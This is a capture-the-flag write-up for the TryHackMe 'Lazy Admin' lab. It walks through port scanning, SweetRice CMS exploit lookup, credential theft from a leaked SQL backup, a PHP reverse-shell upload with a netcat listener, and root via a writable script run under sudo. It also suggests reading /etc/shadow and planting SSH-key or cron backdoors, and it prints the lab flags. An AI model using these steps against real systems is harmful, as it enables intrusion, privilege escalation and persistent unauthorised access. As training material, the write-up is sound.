# Write Up for Try Hack Me box - [Lazy Admin](https://tryhackme.com/room/lazyadmin)

As the name suggests, Lazy Admin is Easy Box centered around MisConfigurations.\
First it is a vulnerable version of a CMS followed by a improper permissions on the root files.

> Pratyush Prakhar (5#1NC#4N) - 08/12/2023

## RECONNAISSANCE

1. Scan the box with rustscan.
	1. Full port scan --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/rustscan/all.nmap)

	**Results**

	```bash
	$ rustscan --range 1-65535 -a 10.10.162.148 -- -oN nmap/all.nmap 
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Nmap? More like slowmap.🐢

	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.162.148:22
	Open 10.10.162.148:80
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -oN nmap/all.nmap" on ip 10.10.162.148
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 17:45 IST
	Initiating Ping Scan at 17:45
	Scanning 10.10.162.148 [2 ports]
	Completed Ping Scan at 17:45, 0.19s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 17:45
	Completed Parallel DNS resolution of 1 host. at 17:45, 0.05s elapsed
	DNS resolution of 1 IPs took 0.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 17:45
	Scanning 10.10.162.148 [2 ports]
	Discovered open port 80/tcp on 10.10.162.148
	Discovered open port 22/tcp on 10.10.162.148
	Completed Connect Scan at 17:45, 0.15s elapsed (2 total ports)
	Nmap scan report for 10.10.162.148
	Host is up, received syn-ack (0.18s latency).
	Scanned at 2023-11-03 17:45:50 IST for 0s

	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack
	80/tcp open  http    syn-ack

	Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
	```

	2. Full Service and Scripts scan on the found ports. --> [nmap file here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/rustscan/main.nmap)

	**Results**

	```bash
	$ rustscan -a 10.10.162.148 -- -sC -sV -oN nmap/main.nmap
	.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
	| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
	| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
	`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
	The Modern Day Port Scanner.
	________________________________________
	: http://discord.skerritt.blog           :
	: https://github.com/RustScan/RustScan :
	--------------------------------------
	Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

	[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
	[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
	Open 10.10.162.148:22
	Open 10.10.162.148:80
	[~] Starting Script(s)
	[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV -oN nmap/main.nmap" on ip 10.10.162.148
	Depending on the complexity of the script, results may take some time to appear.
	[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 17:44 IST
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.00s elapsed
	Initiating Ping Scan at 17:44
	Scanning 10.10.162.148 [2 ports]
	Completed Ping Scan at 17:44, 0.18s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 17:44
	Completed Parallel DNS resolution of 1 host. at 17:44, 0.08s elapsed
	DNS resolution of 1 IPs took 0.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
	Initiating Connect Scan at 17:44
	Scanning 10.10.162.148 [2 ports]
	Discovered open port 80/tcp on 10.10.162.148
	Discovered open port 22/tcp on 10.10.162.148
	Completed Connect Scan at 17:44, 0.20s elapsed (2 total ports)
	Initiating Service scan at 17:44
	Scanning 2 services on 10.10.162.148
	Completed Service scan at 17:44, 6.42s elapsed (2 services on 1 host)
	NSE: Script scanning 10.10.162.148.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 6.25s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.77s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.00s elapsed
	Nmap scan report for 10.10.162.148
	Host is up, received conn-refused (0.19s latency).
	Scanned at 2023-11-03 17:44:31 IST for 14s

	PORT   STATE SERVICE REASON  VERSION
	22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
	|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE=
	|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
	80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Apache2 Ubuntu Default Page: It works
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	NSE: Script Post-scanning.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.00s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.00s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 17:44
	Completed NSE at 17:44, 0.00s elapsed
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 14.34 seconds

	```

2. There are **2 TCP** ports open. 
	1. *Port 22* - SSH - **OpenSSH 7.2p2**
	2. *Port 80* - HTTP - **Apache httpd 2.4.18**

3. Let's look into them one by one.

## WEB

1. Let's first check out the web server on port 80. 
	1. We get a default Apache page with no links going out.
	2. We will go for the low hanging fruit - robots, page source and try to get some information.
	3. We can run sub domain check on this port using `feroxbuster`.
	4. Look through a proxy to get more details on the request:response model setup.
	5. Run a basic Nikto Scan. The results can be obtained here - [Nikto Scan](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/web/nikto.txt)
\
![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/images/web.png)
\
2. Through the [FeroxBuster Scan](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/web/ferox.out), we get to the `/content` sub-directory which tells that it is running a CMS named **Sweet Rice**.
\
![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/images/sr.png)
\
On further analysis the `/content/changelog.txt` reveals the version number of the CMS as *1.5.0*. This can be useful if the software has `known vulnerabilities.`. Time to reach out to ExploitDB for some answers.
\
![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/images/sr_ver.png)
\
3. Using the well known tool `searchsploit` (CLI tool for ExploitDB), we find that there are known disclosure and file inclusion vulnerabilities for version *1.5.1* and thus should be valid for a older version such as ours. Let's construct the exploit chain.

```bash
$ searchsploit sweet rice 
------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                   |  Path
------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                          | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                       | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                        | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                          | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                              | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                     | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                            | php/webapps/14184.txt
------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

4. Exploit Chain
	1. There is a [SQL Backup File Disclosure](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/web/exploit/40718.txt) that allows us to fetch a old [Backup File](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/web/exploit/mysql_bakup_20191129023059-1.5.1.sql)
	\
	![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/images/sql_bakup.png)
	\
	2. We get some credentials from this file which can be seen here --> [creds file](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/creds.txt). Might need to crack the hash. You can employ either the cat or john. 
	3. Let's try these keys to the found login door at `/content/ac/`. And we are in as the CMS manager.
	\
	![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/images/login.png)
	\
	4. Let's now work on the file inclusion vulnerability so that we can upload a malicious PHP script and execute it to get a reverse shell on the box. The steps defined in the [known exploit](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/web/exploit/40716.py) are as follows
		1. Go to the `media center` where you can upload our [malicious file](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/web/exploit/revshell.php5).
		\
		![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/images/mc.png)
		\
		2. Can be invoked from the subdirectory as `/attachment/revshell.php` to invoke the uploaded revshell.
		\
		![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/images/revshell.png)
		\

## INITIAL ACCESS

1. We get a reverse shell on our `netcat listener`. Let's stabilize it to make it easier to operate. *python3* is present. Let's use it.

```bash
$ nc -lnvvp 1337                                                             
listening on [any] 1337 ...
connect to [10.17.88.193] from (UNKNOWN) [10.10.162.148] 47862
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 15:16:19 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@THM-Chal:/$ ^Z
zsh: suspended  nc -lnvvp 1337
                                                                                                                                   
┌──(kali㉿kali)-[~/…/Easy/Lazy Admin/web/exploit]
└─$ stty raw -echo;fg                    
[1]  + continued  nc -lnvvp 1337

www-data@THM-Chal:/$ export TERM=xterm
www-data@THM-Chal:/$
```

2. We get in as `www-data` user. Let's manually enumerate the system. Few places to look into
	1. **/home** --> we can read the contents in the `itguy` directory. We thus obtain the *user.txt* flag.
	```bash
	www-data@THM-Chal:/home$ ls
	itguy
	www-data@THM-Chal:/home$ cd itguy/
	www-data@THM-Chal:/home/itguy$ ls
	Desktop    Downloads  Pictures  Templates  backup.pl         mysql_login.txt
	Documents  Music      Public    Videos     examples.desktop  user.txt
	www-data@THM-Chal:/home/itguy$ cat user.txt 
	THM{********************************}
	www-data@THM-Chal:/home/itguy$ cat mysql_login.txt 
	rice:randompass
	www-data@THM-Chal:/home/itguy$ cat backup.pl 
	#!/usr/bin/perl

	system("sh", "/etc/copy.sh");
	```
	2. We also find that the `backup.pl` is owned by **root:root** but anyone can execute it. It is executing a shell file. Let's find a way to manipulate it and execute our commands as root.

	```bash
	www-data@THM-Chal:/home/itguy$ ls -la
	total 148
	drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
	drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
	-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
	-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
	..........................................................................................
	-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
	..........................................................................................
	-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
	-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
	```
	
	3. Even better. `/etc/copy.sh` is a file owned by by **root:root** but anyone can write to it and execute it. We can directly run it as sudo without any password as defined in `sudo -l`.
	
	```bash
	www-data@THM-Chal:/home/itguy$ ls -la /etc/copy.sh 
	-rw-r--rwx 1 root root 81 Nov 29  2019 copy.sh
	www-data@THM-Chal:/home/itguy$ sudo -l
	Matching Defaults entries for www-data on THM-Chal:
		env_reset, mail_badpass,
		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User www-data may run the following commands on THM-Chal:
		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
	```

## ROOT ACCESS

1. Let's change the `/etc/copy.sh` file simply to run bash in interactive mode. This will land as in root's bash.

```bash
www-data@THM-Chal:/home/itguy$ echo  "/bin/bash -i" > /etc/copy.sh 
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
/bin/bash -i
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
root@THM-Chal:/home/itguy# whomai
No command 'whomai' found, did you mean:
 Command 'whoami' from package 'coreutils' (main)
whomai: command not found
root@THM-Chal:/home/itguy# whoami
root
```

2. The Box is PAWNEd!!!. Let's get the root flag in `/root` directory.
```bash
root@THM-Chal:~# ls
root.txt
root@THM-Chal:~# cat root.txt 
THM{********************************}
```


## EXTRA TREATS

1. We can now obtain the [following files](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/ssh/etc) easily that can be used later.
	1. **/etc/passwd**
	2. **/etc/shadow**
	3. **/etc/hosts**
	4. **/etc/sudoers**
	5. **/etc/crontab**
	6. **/proc**

2. We can also add our *ssh keys* to `authorized_keys` to get a foothold on the box. You can use other methods like crons and process hijacking as well to plant a backdoor.

3. Find out more with the linpeas scans that can be obtained [here](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Easy/Lazy%20Admin/ssh/tmp).

## FLAGS

1. User Flag - `THM{63e5bce9271952aad1113b6f1ac28a07}`

2. Root Flag - `THM{6637f41d0177b6f37cb20d775124699f}`

**Stay Tuned On**\
[Github](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)